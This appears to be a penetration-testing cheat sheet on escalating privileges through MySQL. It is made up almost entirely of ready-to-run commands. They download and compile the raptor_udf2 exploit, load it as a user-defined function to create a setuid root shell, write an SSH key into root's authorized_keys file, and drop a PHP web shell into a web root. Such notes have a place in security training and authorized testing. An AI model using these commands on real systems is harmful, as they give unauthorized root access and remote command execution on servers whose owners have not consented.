---
title: "Mysql Privilege Escalation"
date: 2024-6-27
tags: ["mysql", "database", "RCE", "php", "UDF", "exploit"]
---

---
### Privilege Escalation

#### User Defined Function (UDF)

```bash
# Get the raptor_udf2.c
wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c

# Compile the source script
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# Copy to target folder
cp raptor_udf2.so /dev/shm/raptor_udf2.so

# Connect to database as root
mysql -u root -pPassword mysql

# UDF
create table foo(line blob);
insert into foo values(load_file('/dev/shm/raptor_udf2.so'));

# Get plug-in directory
show variables like '%plugin%';
+-----------------+---------------------------------------------+
| Variable_name   | Value                                       |
+-----------------+---------------------------------------------+
| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
| plugin_maturity | gamma                                       |
+-----------------+---------------------------------------------+

# Copy the plugin_dir value
select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'; 
create function do_system returns integer soname 'raptor_udf2.so';

# RCE
select do_system('cp /bin/bash /tmp/shell; chmod 4777 /tmp/shell');
```

#### Add ssh public key to root

```bash
# Connect to database as root
mysql -u root -pPassword mysql

# Check privilege
select current_user();
show grants for root@localhost;

# If mysql file write is not able to append or overwrite authorized_keys
select "ssh-ed25519 AAAAC4NzaC1lZDI1NTE8AAAAINAhYR5O6zwRnV147lX8FuuMLs7o+K5/WfaoYVa8SmbR user@computer" into outfile "/root/.ssh/authorized_keys2";
```

#### Create php File from Database to RCE

```mysql
create table test(stuff text);
insert into test values('<?php system($_REQUEST["cmd"]); ?>');
select * from test into dumpfile 'C:\\xampp\\htdocs\\cmd.php';
```

<br>